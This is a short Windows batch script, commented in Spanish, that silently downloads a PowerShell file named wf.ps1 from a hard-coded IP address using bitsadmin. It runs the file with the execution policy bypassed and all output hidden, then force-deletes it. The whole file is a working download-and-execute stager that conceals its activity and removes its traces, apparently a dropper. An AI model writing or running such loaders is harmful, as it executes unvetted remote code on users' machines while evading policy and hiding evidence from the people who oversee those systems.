@echo off
setlocal

REM Define la URL del archivo PowerShell
set "url=http://172.28.111.152/wf.ps1"

REM Obtiene la ruta del directorio actual donde se ejecuta el .bat
set "current_dir=%cd%"

REM Define la ruta completa del archivo local donde se guardará el script
set "script_file=%current_dir%\wf.ps1"

REM Descarga el script de forma silenciosa
bitsadmin /transfer download_script /download /priority normal "%url%" "%script_file%" >nul 2>&1

if errorlevel 1 (
    echo Error al descargar el script.
    goto :eof
)

REM Ejecuta el script de forma silenciosa y elimina el archivo al finalizar
powershell.exe -ExecutionPolicy Bypass -File "%script_file%" >nul 2>&1
if exist "%script_file%" del /f /q "%script_file%"

endlocal